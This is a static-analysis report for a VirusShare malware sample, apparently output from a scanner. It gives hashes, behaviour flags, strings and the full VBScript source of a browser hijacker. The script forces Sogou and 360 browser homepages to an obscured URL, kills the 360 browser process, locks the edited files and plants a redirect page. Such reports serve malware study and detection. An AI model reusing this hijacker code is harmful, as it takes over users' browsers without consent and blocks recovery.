{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AppActivate": "May control another application by simulating user keystrokes",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CreateObject": "May create an OLE object",
            "RegRead": "May read registry keys",
            "SendKeys": "May control another application by simulating user keystrokes",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Write": "May write to a file",
            "chr": "May attempt to obfuscate specific str",
            "run": "May run an executable file or a system command"
        },
        "macro": "On Error Resume Next \n\nDim ProgramFilesPath '\u03f5\u0373\u00b7\ufffd\ufffd\nDim AllUsersPath     \nDim usersPath\nDim appPath\n'<!-- thNLgMEcAEMZbMx7QJSQ -->\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nProgramFilesPath = WSHShell.ExpandEnvironmentStrings(\"%ProgramFiles%\") & \"\\\" '\ufffd\ufffd\u0221Program Files\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\nAllUsersPath = WSHShell.ExpandEnvironmentStrings(\"%AllUsersProfile%\") & \"\\\" 'ALL USERS\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\nusersPath=WSHShell.ExpandEnvironmentStrings(\"%USERPROFILE%\") & \"\\\" 'USERS\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\nappPath=WSHShell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\\" 'application data\ufffd\ufffd\ufffd\ufffd\u00b7\ufffd\ufffd\n\nSet fso = CreateObject(\"scripting.filesystemobject\")\n\nDim str\nDim strValue\nDim newNode\nDim SogouP\nDim xmlRoot\nDim path360\nDim FileName\n\nDim URL\n\nURL = \"http://%77%77%77%2E%31%31%36%36%77%2E%63%6F%6D/?v\"\nSogouP = appPath & \"SogouExplorer\"\n\nCall Edit360()\nCall EditSogou()\n \n\nSub EditSogou()\n  \n  str = WshShell.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\SogouExplorer\\\")\n  \n  If str <> \"\" Then\n\t\n    FileName = SogouP & \"\\config.xml\"\n    \n\tIf fso.FileExists(FileName) Then\n\t\t'MsgBox SogouP\n\t\tSet xmlDoc = CreateObject(\"Microsoft.XMLDOM\") \n\t\txmlDoc.async = False \n\t\txmlDoc.load(FileName)\n\t\tSet xmlRoot = xmlDoc.documentElement \n\t\t\n\t\ti = 0 \n\t\t\n\t\tSet newNode = xmlRoot.childNodes.item(i)\n\t\t\n\t\t'MsgBox newNode.getAttribute(\"homepagetype\")\n\t\t\n\t\t'MsgBox newNode.attributes.getNamedItem(\"homepagetype\").text\n\t\t    \n\t\tnewNode.attributes.getNamedItem(\"homepagetype\").text = \"3\"\n\t\tnewNode.attributes.getNamedItem(\"homepage\").text = URL\n\t\txmlDoc.save(FileName) \n\t\tWshShell.run \"attrib \"\"\" & FileName & \"\"\" +R\",0\n        WshShell.run \"cmd /c echo Y| cacls \"\"\" & FileName & \"\"\" /P Everyone:R\",0\n\t\t\n\t\tFileName = str & \"\\StartPage\\Selector\\index.html\"\n\t\tIf fso.FileExists(FileName) Then\n\t\t   fso.DeleteFile(FileName)\n\t\t   \n\t\t   strAll = \"<meta http-equiv=\"\"refresh\"\"                                                                           \t\t\t\t                                               content=\"\"0.1;url=\"&URL&\"?http://www.baidu.com/\"\">\"\n\t\t   \n\t\t   Set r =  fso.OpenTextFile(FileName,2,true,-2)\n\t\t       r.Write(strAll)\n\t\t       r.Close\n\t\tEnd if\n\tEnd If\nEnd If\n\n\nEnd sub\n\n\nSub Edit360()\n   path360 = appPath & \"360se\"\n\n    Dim APP\n    \n\tIf fso.FileExists(path360 & \"\\360se.ini\") Then\n\t\n\t\tIf fso.FileExists(path360 & \"\\360se_s.ini\") Then\n\t\t\n\t\t\tKillprcgram(\"360se.exe\") \n\t\t\tWScript.Sleep 300\n\t\t\t\n\t\t\tapp = WshShell.Run(\"Explorer /select, \" & path360 & \"\\360se_s.ini\" ,0)\n\t\t\t\n\t\t\t\n\t\t\tWScript.Sleep 300\n\t\t\tWshShell.AppActivate app\n\t\t\tWScript.Sleep 100\n\n\t\t\tWshShell.SendKeys \"{DEL}\" \n\t\t\tWScript.Sleep 200\n\t\t \tWshShell.SendKeys \"{ENTER}\"\n\t\t \tWScript.Sleep 200\n\t\t \t'WshShell.SendKeys \"%{F4}\"\n\n\t\t \n\n        If fso.FileExists(path360 & \"\\abcd.ini\") Then fso.DeleteFile(path360 & \"\\abcd.ini\")\n        '  WshShell.run \"cmd.exe /c ren \"  & chr(34) & path360 & \"\\360se_s.ini\" & chr(34) &  \" abcd.ini\"\n\t\tEnd If\n\t\n       Call Write360\n\t\n\tEnd If\nEnd Sub\n\n\nSub Write360()\n    Dim IsWrite\n    \tIsWrite =False\n\t \n    Dim strtmp\n\n    dim strAll\n    \tstrAll =\"\"\n\n     Set r =  fso.OpenTextFile(path360 & \"\\360se.ini\",1,false)\n\t \n\t\tDo While not r.AtEndOfStream\n\t\t\tstrtmp  = r.ReadLine\n\t\t\tIf InStr(strtmp,\"HomePage\") =1 Then\n\t\t\t\tstrAll = strAll & \"HomePage=\" & URL & Chr(13) & Chr(10)\n\t\t\t\tIsWrite=true\n\t\t\tElse\n\t\t\t\tstrAll = strAll & strtmp & Chr(13) & Chr(10)\n\t\t\tEnd If\n\t\tLoop\n\t\t\n\t\tSet r =  fso.OpenTextFile(path360 & \"\\360se.ini\",1,false)\n\t\tIf IsWrite=False Then\n\t\t   strtmp  = r.ReadAll()\n\t\t   strAll = Replace(strtmp,\"[Option]\",\"[Option]\" & Chr(13) & Chr(10) & \"HomePage=\" & URL & Chr(13) & Chr(10)  )\n\t\tEnd if\n\t\tr.Close\n\t\t\n\t\tSet r =  fso.OpenTextFile(path360 & \"\\360se.ini\",2,true,-2)\n\t\tr.Write(strAll)\n\t\tr.Close\nEnd sub\n \n\n \n\nFunction Killprcgram(Pro)\n   Set objWMIService = Getobject(\"winmgmts:\\\\.\\root\\cimv2\")\n   set objs =objwmiservice.execQuery(\"select * from Win32_Process where name='\" & Pro & \"'\")\n   For Each obj in objs\n     obj.Terminate\n   Next\n   Set objs = Nothing\n   Set objWMIService = Nothing\nEnd Function\n\n\n'Set oReg=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" &_\n'strComputer & \"\\root\\default:StdRegProv\")\n\n'oReg.GetStringValue HKEY_LOCAL_MACHINE,\"SOFTWARE\",\"SogouExplorer\",strValue\n\n'MsgBox strValue"
    },
    "filename": "VirusShare_4819ef8551ed801e7f76271c6133c8c9",
    "filesize": 4316,
    "filetype": "exported SGML document, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "4819ef8551ed801e7f76271c6133c8c9",
        "sha1": "df5c8d324efac8b7ccbe1bf6520e88f883db0379",
        "sha256": "e528bfb295a126aa1a6dd718345b2290103215b64654fd47e6979d3a8dca752f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "On Error Resume Next ",
            "Dim ProgramFilesPath '\u03f5\u0373",
            "Dim AllUsersPath     ",
            "Dim usersPath",
            "Dim appPath",
            "'<!-- thNLgMEcAEMZbMx7QJSQ -->",
            "Set WshShell = WScript.CreateObject(\"WScript.Shell\")",
            "ProgramFilesPath = WSHShell.ExpandEnvironmentStrings(\"%ProgramFiles%\") & \"\\\" '\u0221Program Files",
            "AllUsersPath = WSHShell.ExpandEnvironmentStrings(\"%AllUsersProfile%\") & \"\\\" 'ALL USERS",
            "usersPath=WSHShell.ExpandEnvironmentStrings(\"%USERPROFILE%\") & \"\\\" 'USERS",
            "appPath=WSHShell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\\" 'application data",
            "Set fso = CreateObject(\"scripting.filesystemobject\")",
            "Dim str",
            "Dim strValue",
            "Dim newNode",
            "Dim SogouP",
            "Dim xmlRoot",
            "Dim path360",
            "Dim FileName",
            "Dim URL",
            "URL = \"http://%77%77%77%2E%31%31%36%36%77%2E%63%6F%6D/?v\"",
            "SogouP = appPath & \"SogouExplorer\"",
            "Call Edit360()",
            "Call EditSogou()",
            "Sub EditSogou()",
            "  str = WshShell.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\SogouExplorer\\\")",
            "  If str <> \"\" Then",
            "    FileName = SogouP & \"\\config.xml\"",
            "    ",
            "\tIf fso.FileExists(FileName) Then",
            "\t\t'MsgBox SogouP",
            "\t\tSet xmlDoc = CreateObject(\"Microsoft.XMLDOM\") ",
            "\t\txmlDoc.async = False ",
            "\t\txmlDoc.load(FileName)",
            "\t\tSet xmlRoot = xmlDoc.documentElement ",
            "\t\ti = 0 ",
            "\t\tSet newNode = xmlRoot.childNodes.item(i)",
            "\t\t'MsgBox newNode.getAttribute(\"homepagetype\")",
            "\t\t'MsgBox newNode.attributes.getNamedItem(\"homepagetype\").text",
            "\t\t    ",
            "\t\tnewNode.attributes.getNamedItem(\"homepagetype\").text = \"3\"",
            "\t\tnewNode.attributes.getNamedItem(\"homepage\").text = URL",
            "\t\txmlDoc.save(FileName) ",
            "\t\tWshShell.run \"attrib \"\"\" & FileName & \"\"\" +R\",0",
            "        WshShell.run \"cmd /c echo Y| cacls \"\"\" & FileName & \"\"\" /P Everyone:R\",0",
            "\t\tFileName = str & \"\\StartPage\\Selector\\index.html\"",
            "\t\tIf fso.FileExists(FileName) Then",
            "\t\t   fso.DeleteFile(FileName)",
            "\t\t   ",
            "\t\t   strAll = \"<meta http-equiv=\"\"refresh\"\"                                                                           \t\t\t\t                                               content=\"\"0.1;url=\"&URL&\"?http://www.baidu.com/\"\">\"",
            "\t\t   ",
            "\t\t   Set r =  fso.OpenTextFile(FileName,2,true,-2)",
            "\t\t       r.Write(strAll)",
            "\t\t       r.Close",
            "\t\tEnd if",
            "\tEnd If",
            "End If",
            "End sub",
            "Sub Edit360()",
            "   path360 = appPath & \"360se\"",
            "    Dim APP",
            "    ",
            "\tIf fso.FileExists(path360 & \"\\360se.ini\") Then",
            "\t\tIf fso.FileExists(path360 & \"\\360se_s.ini\") Then",
            "\t\t\tKillprcgram(\"360se.exe\") ",
            "\t\t\tWScript.Sleep 300",
            "\t\t\tapp = WshShell.Run(\"Explorer /select, \" & path360 & \"\\360se_s.ini\" ,0)",
            "\t\t\tWScript.Sleep 300",
            "\t\t\tWshShell.AppActivate app",
            "\t\t\tWScript.Sleep 100",
            "\t\t\tWshShell.SendKeys \"{DEL}\" ",
            "\t\t\tWScript.Sleep 200",
            "\t\t \tWshShell.SendKeys \"{ENTER}\"",
            "\t\t \tWScript.Sleep 200",
            "\t\t \t'WshShell.SendKeys \"%{F4}\"",
            "        If fso.FileExists(path360 & \"\\abcd.ini\") Then fso.DeleteFile(path360 & \"\\abcd.ini\")",
            "        '  WshShell.run \"cmd.exe /c ren \"  & chr(34) & path360 & \"\\360se_s.ini\" & chr(34) &  \" abcd.ini\"",
            "\t\tEnd If",
            "       Call Write360",
            "\tEnd If",
            "End Sub",
            "Sub Write360()",
            "    Dim IsWrite",
            "    \tIsWrite =False",
            "    Dim strtmp",
            "    dim strAll",
            "    \tstrAll =\"\"",
            "     Set r =  fso.OpenTextFile(path360 & \"\\360se.ini\",1,false)",
            "\t\tDo While not r.AtEndOfStream",
            "\t\t\tstrtmp  = r.ReadLine",
            "\t\t\tIf InStr(strtmp,\"HomePage\") =1 Then",
            "\t\t\t\tstrAll = strAll & \"HomePage=\" & URL & Chr(13) & Chr(10)",
            "\t\t\t\tIsWrite=true",
            "\t\t\tElse",
            "\t\t\t\tstrAll = strAll & strtmp & Chr(13) & Chr(10)",
            "\t\t\tEnd If",
            "\t\tLoop",
            "\t\tSet r =  fso.OpenTextFile(path360 & \"\\360se.ini\",1,false)",
            "\t\tIf IsWrite=False Then",
            "\t\t   strtmp  = r.ReadAll()",
            "\t\t   strAll = Replace(strtmp,\"[Option]\",\"[Option]\" & Chr(13) & Chr(10) & \"HomePage=\" & URL & Chr(13) & Chr(10)  )",
            "\t\tEnd if",
            "\t\tr.Close",
            "\t\tSet r =  fso.OpenTextFile(path360 & \"\\360se.ini\",2,true,-2)",
            "\t\tr.Write(strAll)",
            "\t\tr.Close",
            "End sub",
            "Function Killprcgram(Pro)",
            "   Set objWMIService = Getobject(\"winmgmts:\\\\.\\root\\cimv2\")",
            "   set objs =objwmiservice.execQuery(\"select * from Win32_Process where name='\" & Pro & \"'\")",
            "   For Each obj in objs",
            "     obj.Terminate",
            "   Next",
            "   Set objs = Nothing",
            "   Set objWMIService = Nothing",
            "End Function",
            "'Set oReg=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" &_",
            "'strComputer & \"\\root\\default:StdRegProv\")",
            "'oReg.GetStringValue HKEY_LOCAL_MACHINE,\"SOFTWARE\",\"SogouExplorer\",strValue",
            "'MsgBox strValue"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.baidu.com/",
            "http://%77%77%77%2E%31%31%36%36%77%2E%63%6F%6D/?v"
        ]
    },
    "time": "0:00:00.312286",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
